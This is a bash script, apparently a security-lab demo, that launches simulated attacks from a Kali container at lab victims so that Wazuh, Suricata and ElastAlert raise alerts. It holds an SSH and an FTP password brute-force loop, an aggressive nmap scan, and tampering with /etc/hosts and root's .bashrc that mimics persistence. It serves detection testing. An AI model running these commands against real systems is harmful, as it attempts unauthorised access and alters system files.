#!/bin/bash
# ══════════════════════════════════════════════════════════════
#   NETDEFENDER SOC — DEMO ATTACK SUITE
#   Triggers: 1 Slack alert + 1 Gmail alert + 1 AR block alert
# ══════════════════════════════════════════════════════════════
GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
log()  { echo -e "${GREEN}[$(date '+%H:%M:%S')] ✓${NC} $1"; }
info() { echo -e "${CYAN}[$(date '+%H:%M:%S')] ▶${NC} $1"; }
wait_msg() { echo -e "${YELLOW}[$(date '+%H:%M:%S')] ⏳${NC} $1"; }

echo ""
echo "╔═══════════════════════════════════════════════════╗"
echo "║       NETDEFENDER SOC — DEMO ATTACK SUITE        ║"
echo "╚═══════════════════════════════════════════════════╝"
echo ""

# ── 1. SSH BRUTE FORCE ── triggers 5763 (level 10) → Slack + Gmail + AR block
info "ATTACK 1: SSH Password Brute Force against victim-ubuntu"
info "  Expected: Rule 5763 → Slack alert + Gmail + AR iptables block"
docker exec kali-attacker bash -c "
  for i in \$(seq 1 25); do
    sshpass -p \"wrongpassword\${i}\" \
      ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 \
      root@victim-ubuntu echo ok 2>/dev/null
  done
"
log "SSH brute force complete (25 attempts)"
wait_msg "Waiting 20s for detection..."
sleep 20

# ── 2. PORT SCAN ── triggers Suricata/Wazuh port scan rules
info "ATTACK 2: Aggressive port scan against victim-ubuntu"
info "  Expected: Suricata IDS alert → Slack"
docker exec kali-attacker bash -c "
  nmap -sS -p 1-1024 --min-rate 500 -T4 victim-ubuntu 2>/dev/null | tail -5
"
log "Port scan complete"
sleep 5

# ── 3. FTP BRUTE FORCE ── rule 11312 → Slack
info "ATTACK 3: FTP brute force against victim-ftp"
info "  Expected: Rule 11312 → Slack"
docker exec kali-attacker bash -c "
  for i in \$(seq 1 20); do
    echo -e 'USER root\nPASS wrongpass\${i}\nQUIT' | nc -w1 victim-ftp 21 2>/dev/null
  done
"
log "FTP brute force complete"
sleep 5

# ── 4. FIM TRIGGER ── rule 550 → Slack (file integrity)
info "ATTACK 4: Critical file modification on victim-ubuntu"
info "  Expected: FIM rule 550/554 → Slack (Defense Evasion / Persistence)"
docker exec victim-ubuntu bash -c "
  echo '# C2 entry: 10.0.0.99 malicious.c2.test' >> /etc/hosts
  echo 'export PATH=/tmp:\$PATH' >> /root/.bashrc
"
log "FIM changes written (/etc/hosts + .bashrc)"

# ── WAIT FOR PROPAGATION ────────────────────────────────────────────────────
echo ""
wait_msg "Waiting 90s for all detections to flow through → Slack + Gmail..."
echo ""
for i in 9 8 7 6 5 4 3 2 1; do
  echo -ne "\r  ${i}0 seconds remaining...  "
  sleep 10
done
echo -e "\r  Done!                          "

# ── RESULTS CHECK ────────────────────────────────────────────────────────────
echo ""
echo "════════════════ RESULTS ═════════════════"

echo ""
echo "── Wazuh rule hits ──"
for rule in 5763 5720 5712 5551 11312; do
  count=$(docker exec wazuh-manager grep -c "Rule: ${rule}" /var/ossec/logs/alerts/alerts.log 2>/dev/null || echo 0)
  echo "  Rule $rule: $count hits"
done

echo ""
echo "── Active Response ──"
docker exec victim-ubuntu cat /var/ossec/logs/active-responses.log 2>/dev/null | tail -5 || echo "  (empty)"

echo ""
echo "── iptables DROP rules ──"
docker exec victim-ubuntu iptables -L INPUT -n 2>/dev/null | grep DROP || echo "  (none yet)"

echo ""
echo "── ElastAlert fired ──"
docker logs elastalert 2>&1 | grep "alerts sent" | grep -v ", 0 alerts" | tail -8

echo ""
echo "── Wazuh ↔ Slack integration ──"
docker exec wazuh-manager grep -c "slack" /var/ossec/etc/ossec.conf 2>/dev/null | xargs -I{} echo "  Slack integrations: {}"

echo "════════════════════════════════════════════"
echo ""
echo "✅ Check Slack and Gmail now — alerts should have arrived!"
echo ""
